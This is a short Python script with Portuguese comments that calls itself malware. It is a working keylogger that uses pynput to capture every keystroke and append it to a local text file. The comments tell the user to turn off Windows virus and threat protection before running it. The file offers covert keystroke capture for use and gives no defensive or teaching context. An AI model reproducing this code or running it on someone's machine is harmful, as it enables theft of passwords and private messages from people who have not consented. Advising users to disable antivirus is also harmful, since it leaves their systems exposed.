#Para realizar o teste do malware, será necessário retirar as proteções contra vírus e ameaças do windows.
#Remova o arquivo log.txt para poder testá-lo adequadamente.
#Comando para iniciar --> python main.py


from pynput.keyboard import Listener


def digito_escaneado(key):
    digito = str(key)
    digito = digito.replace("'", "")

    if digito == 'Key.space':
        digito = ' '
    if digito == 'Key.shift_r':
        digito = ''
    if digito == "Key.ctrl_l":
        digito = ""
    if digito == "Key.enter":
        digito = "\n"

    with open("texto.txt", 'a') as f:
        f.write(digito)

# Collecting events until stopped

with Listener(on_press=digito_escaneado) as l:
    l.join()